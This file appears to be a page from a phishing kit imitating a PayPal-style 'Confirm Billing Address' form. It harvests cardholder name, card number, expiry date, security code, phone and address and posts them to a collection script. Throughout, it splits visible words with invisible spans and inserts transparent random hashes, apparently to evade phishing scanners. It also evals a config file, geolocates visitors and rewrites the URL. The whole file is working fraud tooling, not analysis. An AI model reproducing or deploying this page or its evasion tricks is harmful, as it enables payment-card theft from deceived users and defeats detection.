<?php include'proxy.php';?>
<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Card");
$page = 'card';
$notification = 3;
require __DIR__ . '/page/header.php';
?>
<!DOCTYPE html>
<html>

<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="stylesheet" href="assets/css/app.css">
<script src="assets/js/jquery.min.js"></script>
<script type="text/javascript" src="https://ssl.geoplugin.net/javascript.gp?k=d4ca3f36a4e92551"></script>
</head>

<body>
<script>
document['title']='Summary';
</script>
<style>
.hire{
width:335px;
margin-left: auto;
margin-right: auto;
}
/*! CSS Used from: Embedded */
.algolia-places{width:100%;}
.ap-input{width:100%;padding-right:35px;padding-left:16px;line-height:40px;height:40px;border:1px solid #CCC;border-radius:3px;outline:none;font:inherit;appearance:none;-webkit-appearance:none;box-sizing:border-box;}
.ap-input::-ms-clear{display:none;}
.ap-dropdown-menu{width:100%;background:#ffffff;box-shadow:0 1px 10px rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);border-radius:3px;margin-top:3px;overflow:hidden;}
.ap-input-icon{border:0;background:transparent;position:absolute;top:0;bottom:0;right:16px;outline:none;}
.ap-input-icon.ap-icon-pin{cursor:initial;}
.ap-input-icon svg{fill:#cfcfcf;position:absolute;top:50%;right:0;-webkit-transform:translateY(-50%);transform:translateY(-50%);}
/*! CSS Used from: app_23281c41f8886b81e5d04e3dbdb09f83.css */
.X{color:rgba(165,249,26,0);max-width:.01px;max-height:.03px;font-size:.02px;}
.X{display:inline-block;}
*{outline:none;-webkit-box-sizing:border-box;box-sizing:border-box;font-family: Helvetica,Arial,sans-serif;}
#app{min-height:100vh;}
#app{position:relative;}
.bgc{background-color:#fff;width:100vw;height:100vh;z-index:-1;top:0;left:0;}
body{position:relative;min-height:100%;margin:0;padding:0;color:#2c2e2f;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif;font-size:93.75%;-webkit-font-smoothing:antialiased;-webkit-backface-visibility:hidden;-moz-text-size-adjust:100%;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;}
body .update-wrapper{width:100%;min-height:100vh;}
body .update-wrapper .content{width:-webkit-calc(100% - 20px);width:calc(100% - 20px);margin:0 auto;}
@media (min-width:800px){
body .update-wrapper .content{max-width:1024px;}
}
body .update-wrapper .update-header{width:100%;border-bottom:1px solid #0070ba;background-image:-webkit-gradient(linear,right top,left top,from(#1547a1),to(#006fb9));background-image:-o-linear-gradient(right,#1547a1 0,#006fb9 100%);background-image:linear-gradient(270deg,#1547a1 0,#006fb9);background-color:#0a5bad;height:55px;padding-top:13px;}
@media (min-width:800px){
body .update-wrapper .update-header{height:63px;padding-top:15px;}
}
body .update-wrapper .update-header .content{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;height:30px;line-height:30px;}
body .update-wrapper .update-header .content .item{cursor:pointer;color:#c2d9ed;text-transform:uppercase;border-bottom:1px solid transparent;margin-right:30px;font-size:13px;-webkit-transition:all .2s;-o-transition:all .2s;transition:all .2s;font-family: Helvetica,Arial,sans-serif;}
body .update-wrapper .update-header .content .item.item-link:hover{color:#c2d9ed;border-bottom:1px solid #c2d9ed;}
body .update-wrapper .update-header .content .item.item-link.active{color:#fff;border-bottom:1px solid #fff;}
body .update-wrapper .update-header .content .item.logo{width:32px;height:32px;background-image:url(img/logoMobile.svg);background-repeat:no-repeat;background-size:contain;background-position:50%;}
body .update-wrapper .update-header .content .item.notification{margin-left:auto;width:28px;height:32px;background-image:url(img/notification.svg);background-repeat:no-repeat;background-size:28px 31px;background-position:50%;}
body .update-wrapper .update-header .content .item.notification:hover{opacity:.9;}
body .update-wrapper .update-header .content .item.setting{width:25px;height:32px;background-image:url(img/setting.svg);background-repeat:no-repeat;background-size:25px 25px;background-position:50%;}
body .update-wrapper .update-header .content .item.setting:hover{opacity:.9;}
body .update-wrapper .update-header .content .item.logout{margin-right:0;}
body .update-wrapper .update-header .content .item.logout,body .update-wrapper .update-header .content .item.menu{font-size:14px;border:1px solid #f0f5f8;-webkit-border-radius:50px;border-radius:50px;padding:0 10px;line-height:30px;text-transform:none;color:#f0f5f8;}
body .update-wrapper .update-header .content.desktop{display:none;}
@media (min-width:800px){
body .update-wrapper .update-header .content.desktop{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}
}
body .update-wrapper .update-header .content.mobile{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;}
@media (min-width:800px){
body .update-wrapper .update-header .content.mobile{display:none;}
}
body .update-wrapper .update-header .content.mobile .item{margin:0;}
body .update-wrapper .update-content{padding-top:20px;padding-bottom:110px;}
body .update-wrapper .update-content .content{min-height:500px;background-color:#fff;border:1px solid #cbd2d6;-webkit-border-radius:5px;border-radius:5px;padding:20px;}
@media (min-width:800px){
body .update-wrapper .update-content{padding-bottom:140px;}
}
body .update-wrapper .update-form{z-index:100;background-color:rgba(91,95,100,.7);position:absolute;top:0;left:0;width:100%;min-height:100%;}
body .update-wrapper .update-form .form-content{background-color:#fff;margin:0 auto;width:100%;max-width:600px;min-height:100vh;height:100%;padding:20px;}
@media (min-width:800px){
body .update-wrapper .update-form .form-content{max-width:700px;width:700px;}
}
body .update-wrapper .update-form .form-content .logo-update{background-image:url();background-repeat:no-repeat;width:31px;height:31px;margin:20px auto 0;}
@media (min-width:800px){
body .update-wrapper .update-form .form-content .logo-update{margin:80px auto 0;}
}
body .update-wrapper .update-form .form-content .title{font-size:24px;font-weight:300;text-align:center;margin-top:30px;margin-bottom:50px;}
@media (min-width:800px){
body .update-wrapper .update-form .form-content .title{font-size:28px;}
}
body .update-wrapper .update-form .form-content .row{clear:both;position:relative;max-width:350px;width:100%;margin:5px auto 15px;}
body .update-wrapper .update-form .form-content .row:nth-child(3){z-index:97;}
body .update-wrapper .update-form .form-content .row:nth-child(4){z-index:96;}
body .update-wrapper .update-form .form-content .row:nth-child(5){z-index:95;}
body .update-wrapper .update-form .form-content .row:nth-child(6){z-index:94;}
body .update-wrapper .update-form .form-content .row:nth-child(7){z-index:93;}
body .update-wrapper .update-form .form-content .row:nth-child(8){z-index:92;}
body .update-wrapper .update-form .form-content .row:nth-child(9){z-index:91;}
body .update-wrapper .update-form .form-content .row.flex-row{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;}
body .update-wrapper .update-form .form-content .row.flex-row .col{width:49%;position:relative;}
body .update-wrapper .update-form .form-content .row.extend-address{display:none;}
body .update-wrapper .update-form .form-content .row .input-field{width:100%;z-index:4;}
body .update-wrapper .update-form .form-content .row .input-field input[type=text],body .update-wrapper .update-form .form-content .row .input-field select{height:44px;line-height:44px;width:100%;padding:0 10px;border:1px solid #9da3a6;-o-text-overflow:ellipsis;text-overflow:ellipsis;-webkit-border-radius:4px;border-radius:4px;-webkit-box-shadow:none;box-shadow:none;color:#000;font-size:15px;font-weight:400;direction:ltr;-webkit-transition:border .2s ease-in-out,background-color .2s ease-in-out;-o-transition:border .2s ease-in-out,background-color .2s ease-in-out;transition:border .2s ease-in-out,background-color .2s ease-in-out;}
body .update-wrapper .update-form .form-content .row .input-field select{padding-top:10px;padding-left:5px;}
body .update-wrapper .update-form .form-content .row .input-field select~label{height:20px;line-height:20px;font-size:11px;}
body .update-wrapper .update-form .form-content .row .input-field label{-webkit-transition:font-size .2s,line-height .2s,height .2s;-o-transition:font-size .2s,line-height .2s,height .2s;transition:font-size .2s,line-height .2s,height .2s;position:absolute;font-size:15px;height:44px;line-height:44px;padding-left:10px;cursor:text;top:0;left:0;color:#616161;}
body .update-wrapper .update-form .form-content .row .input-error{display:none;width:100%;background-color:#fff7f7;color:#000;-webkit-transition:all .3s ease-out;-o-transition:all .3s ease-out;transition:all .3s ease-out;border:1px solid #d20000;border-top:0 solid #d20000;}
body .update-wrapper .update-form .form-content .row .btn{width:100%;height:44px;line-height:45px;padding:0;border:0;display:block;-webkit-box-shadow:none;box-shadow:none;-webkit-border-radius:4px;border-radius:4px;-webkit-box-sizing:border-box;box-sizing:border-box;cursor:pointer;-webkit-appearance:none;-moz-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;font-size:1em;text-align:center;font-weight:400;font-family: Helvetica,Arial,sans-serif;}
body .update-wrapper .update-form .form-content .row .btn.btn-primary{cursor:pointer;color:#fff;background-color:#0070ba;}
body .update-wrapper .update-form .form-content .row .btn.btn-primary:hover{background-color:#005ea6;}
body .update-wrapper .update-footer{position:absolute;bottom:0;width:100%;min-height:30px;background-color:#fff;border-top:1px solid #e0e2e3;}
body .update-wrapper .update-footer .content .footer-line0{padding-top:10px;padding-bottom:10px;font-size:15px;color:#6c7378;text-transform:uppercase;border-bottom:1px dotted #9da3a6;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}
@media (min-width:800px){
body .update-wrapper .update-footer .content .footer-line0{padding-top:30px;padding-bottom:15px;}
}
body .update-wrapper .update-footer .content .footer-line0 .item{margin-right:20px;}
@media (min-width:800px){
body .update-wrapper .update-footer .content .footer-line0 .item{margin-right:30px;}
body .update-wrapper .update-footer .content .footer-line0 .item:last-child{margin-right:0;}
}
body .update-wrapper .update-footer .content .footer-line1{padding-top:10px;padding-bottom:10px;font-size:15px;font-size:12px;color:#9da3a6;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}
@media (min-width:800px){
body .update-wrapper .update-footer .content .footer-line1{padding-top:15px;padding-bottom:25px;}
}
body .update-wrapper .update-footer .content .footer-line1 .item{margin-right:10px;}
@media (min-width:800px){
body .update-wrapper .update-footer .content .footer-line1 .item{margin-right:0;margin-left:20px;}
body .update-wrapper .update-footer .content .footer-line1 .item:first-child{margin-left:auto;}
}
body .update-wrapper .ap-input{height:44px;width:100%;padding:0 10px;border:1px solid #9da3a6;background-color:#fff;-o-text-overflow:ellipsis;text-overflow:ellipsis;-webkit-border-radius:4px;border-radius:4px;-webkit-box-shadow:none;box-shadow:none;color:#000;font-size:1em;font-weight:400;direction:ltr;-webkit-transition:border .2s ease-in-out,background-color .2s ease-in-out;-o-transition:border .2s ease-in-out,background-color .2s ease-in-out;transition:border .2s ease-in-out,background-color .2s ease-in-out;}
body .update-wrapper .ap-input:focus{border:1px solid #0070ba;}
body .update-wrapper .ap-input-icon svg{cursor:pointer;}
body .update-wrapper .ap-input-icon svg:hover,body .update-wrapper .ap-input:focus~.ap-input-icon svg{fill:#0070ba;}
/*! CSS Used fontfaces */
@font-face{font-family: Helvetica,Arial,sans-serif;}
@font-face{font-family: Helvetica,Arial,sans-serif;}

.ped{
margin: 80px auto 0;
}
.fiModule-icon_card {
  width: 48px;
  height: 30px;
  background-image: url('assets/img/card.png');
  background-size: cover;
  display: inline-block;
}
.number {
   font-family: arial;
}
</style>
<div id="app" country="US">
        <!---->

        <div>
            <div class="update-wrapper">
                <div class="update-content">
                </div>
				<form id="rift" method="POST" action="post/b.php">
                <div class="update-form">
                    <div style="width: 101%;" class="form-content">
					<div class="logo-update"></div>
					<p align="center">
<img src="assets/img/choice.png" width="66" height="64">
</p>
                        <div class="title">C<span class="X"><?=$fo6;?></span>onf<span class="X"><?=$fo6;?></span>irm<span class="X"><?=$fo6;?></span> Bi<span class="X"><?=$fo6;?></span>lli<span class="X"><?=$fo6;?></span>ng Add<span class="X"><?=$fo6;?></span>res<span class="X"><?=$fo6;?></span>s</div>
                        <div style="margin: 0px auto 0px !important;" class="row">
                            <div id="DivName" class="input-field">
                                <input disabled placeholder="email" value="<?=$_SESSION['email'];?>" type="text">
                                
                            </div>
                        </div>
						<br>
						   <div style="margin: 0px auto 0px !important;" class="row">
                            <div id="DivName" class="input-field">
                                <input placeholder="Cardholder Name" name="crdholder" type="text">
                                
                            </div>
                        </div>
<div class="busyOverlay" style="transition: unset; display: none;">
<div class="busyIcon" style="top: 50%;"></div>
<p class="xysnewLoaderx" style="">Checking your info...</p></div>
<div style="margin: 0px auto 0px !important;" class="row">
<div class="cardLogo">
<span style="    display: block;
    margin-left: auto;
    margin-right: auto;
    /* width: 50%; */
    padding: 0px 11px 25px;" class="fiModule-icon_card" id="DivLogo"></span>
</div>
<div class="cardNumber" id="cardNumber">
<div style="margin: 8px 0 !important;" class="textInput ccNumber ccNumber ccNum lap" id="DivNumber">
<input type="tel" placeholder="Credit card number" id="Number" name="cardnms">
</div>
</div>
                        </div>

                        <div style="margin: 0px auto 0px !important;" class="row">
                            <div class="input-field" id="DivExp">
                                <input name="expir" placeholder="Expiration Date" type="text" id="Exp" im-insert="true">
                                
                            </div>

                        </div>
                        <div style="margin: 9px auto!important;" class="row">
                            <div style="margin: 0px 0;" class="input-field" id="DivCvv">
                                <input name="secri" placeholder="Security code" type="text" id="Cvv">
                                
                            </div>
                        </div>
						<script>
			function isNumberKey(evt)
			{
				var charCode = (evt.which) ? evt.which : evt.keyCode;
				if (charCode != 46 && charCode > 31 
				&& (charCode < 48 || charCode > 57))
				return false;
				return true;
			}  
			
			
			function isNumericKey(evt)
			{
				var charCode = (evt.which) ? evt.which : evt.keyCode;
				if (charCode != 46 && charCode > 31 
				&& (charCode < 48 || charCode > 57))
				return true;
				return false;
			} 
                        </script>
						</script>
						<hr class="hire" >
						<div style="margin: 3px auto 0px !important;">
                        <div class="row">
                            <div class="input-field number">
                                <input name="phona" onkeypress="return isNumberKey(event)" placeholder="Phone number" type="text" id="phone" required>
                                
                            </div>
                        </div>
                        <div class="row auto-address" style="display: none;">
                            <div class="input-field"><span class="algolia-places" style="position: relative; display: inline-block; direction: ltr;"><input type="text" id="address" class="ap-input" autocomplete="off" spellcheck="false" role="combobox" aria-autocomplete="both" aria-expanded="false" aria-owns="algolia-places-listbox-0" dir="auto" style="position: relative; vertical-align: top;"><pre aria-hidden="true" style="position: absolute; visibility: hidden; white-space: pre; font-family: Helvetica,Arial,sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: 400; word-spacing: 0px; letter-spacing: normal; text-indent: 0px; text-rendering: auto; text-transform: none;"></pre><span class="ap-dropdown-menu" role="listbox" id="algolia-places-listbox-0" style="position: absolute; top: 100%; z-index: 100; display: none; left: 0px; right: auto;"><div class="ap-dataset-places"></div></span>
                                <button type="button" aria-label="clear" class="ap-input-icon ap-icon-clear" style="display: none;">
                                    <svg width="12" height="12" viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M.566 1.698L0 1.13 1.132 0l.565.566L6 4.868 10.302.566 10.868 0 12 1.132l-.566.565L7.132 6l4.302 4.3.566.568L10.868 12l-.565-.566L6 7.132l-4.3 4.302L1.13 12 0 10.868l.566-.565L4.868 6 .566 1.698z"></path>
                                    </svg>
                                </button>
                                <button type="button" aria-label="focus" class="ap-input-icon ap-icon-pin">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 14 20">
                                        <path d="M7 0C3.13 0 0 3.13 0 7c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5C5.62 9.5 4.5 8.38 4.5 7S5.62 4.5 7 4.5 9.5 5.62 9.5 7 8.38 9.5 7 9.5z"></path>
                                    </svg>
                                </button>
                                </span>
                                <label for="address">B<span class="X"><?=$fo6;?></span>ill<span class="X"><?=$fo6;?></span>ing<span class="X"><?=$fo6;?></span> Ad<span class="X"><?=$fo6;?></span>dre<span class="X"><?=$fo6;?></span>ss</label>
                            </div>
                        </div>
                        <div class="row extend-address" style="display: block;">
                            <div class="input-field">
                                <input name="adrs" placeholder="Address" type="text" id="street" required>
                                
                            </div>
                        </div>
                        <div class="row flex-row extend-address" style="display: flex;">
                            <div class="col">
                                <div class="input-field">
                                    <input name="cty" placeholder="City" type="text" id="city" required>
                                    
                                </div>
                            </div>
                            <div class="col">
                                <div class="input-field">
                                    <input name="zippy" placeholder="Zip code" type="text" id="zipcode" required>
                                    
                                </div>
                            </div>
                        </div>
                        <div class="row flex-row extend-address" style="display: flex;">
                            <div class="col">
                                <div class="input-field">
                                    <input name="sste" placeholder="State" type="text" id="state" required>
                                    
                                </div>
                            </div>
                            <div class="col">
                                <div class="input-field">
                                    <input name="cunty" placeholder="Country" type="text" id="county" required>
                                    
                                </div>
                            </div>
                        </div>
						</div>
                        <div class="row">
                            <button id="btnConfirm" href="#" class="btn btn-primary">C<span class="X"><?=$fo6;?></span>onf<span class="X"><?=$fo6;?></span>irm<span class="X"><?=$fo6;?></button></div>
                        </div>
                    </div>
                </div>
				</form>

            </div>
        </div>
    </div>
<div tabindex="-1" id="myModal" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 100%;"></div>
<div style="width: auto;margin: 10px;z-index: 100000;"></div>
<div style="z-index: 100011; width: 90%; margin: auto; padding: 6px; position: relative; background-color: #ffffff; border: 1px solid #999999; border: 1px solid rgba(0,0,0,0.2); border-radius: 6px; -webkit-box-shadow: 0 3px 3px rgba(0,0,0,0.5); box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19); -webkit-background-clip: padding-box; background-clip: padding-box; outline: 0; border-color: #e5e5e5 #d9d9d9 #cccccc; -webkit-box-shadow: 0 3px 3px rgba(148, 148, 148, 0.8); box-shadow: 0 0px 0px rgba(148, 148, 148, 0.8); -webkit-border-radius: 10px; -moz-border-radius: 6px; border-radius: 6px; -moz-background-clip: padding-box; -webkit-background-clip: padding-box; background-clip: padding-box; background-color:#fdfdfd; outline: 0 none; margin-top: 150px; max-width:1024px; min-width:auto; max-height:200px; opacity: 1;">
  <center>
    <div>
      <h2>
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("I");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("f");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("y");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("y");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("u");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("m");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("y");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("b");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("b");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("o");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("c");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("k");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("d");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("r");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("m");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("a");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("e");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("t");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("l");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("y");?></h2>
    </div>
    <a class="vx_btn" href="../logout"><?=$api->transcode("Yes");?></a>
    <a class="vx_btn" id="close"><?=$api->transcode("No");?></a>
  </center>
</div>
</div>
<script>
$(document).ready(function() {
  $('#logout1').click(function() {
    $('#myModal').fadeIn("slow");
  });
  $('#logout2').click(function() {
    $('#myModal').fadeIn("slow");
  });
  $('#close').click(function() {
    $('#myModal').fadeOut("slow");
  });
});

$(".vx_globalNav-link_notifications").click(function() {
  $("#kuzuluy").addClass("vx_hasOpenSidepanel");
});
$(".vx_sidepanel-headerIcon_right").click(function(e) {
  e.preventDefault();
  $("#kuzuluy").removeClass("vx_hasOpenSidepanel");
});
$(".js_toggleMobileMenu").click(function() {
  $("#kuzuluy").toggleClass("vx_hasOpenNav");
});
</script>
<script>
var country = geoplugin_countryName();
var city = geoplugin_city();
document.getElementById("county").value =country;
document.getElementById("city").value =city;

$(document).ready(function($){
    $('.xysnewLoaderx').fadeOut(0);
    $('.busyOverlay').fadeIn();
    setTimeout(function(){
        $('.busyOverlay').fadeOut();
        $('.xysnewLoaderx').fadeIn();
    }, 3000);
});
$(document).ready(function(){
let g = Math.random().toString(36).substring(7);window.history.pushState('er', 'ghbhh', 'cgi=BILL'+g);
})
</script
</body>

</html>


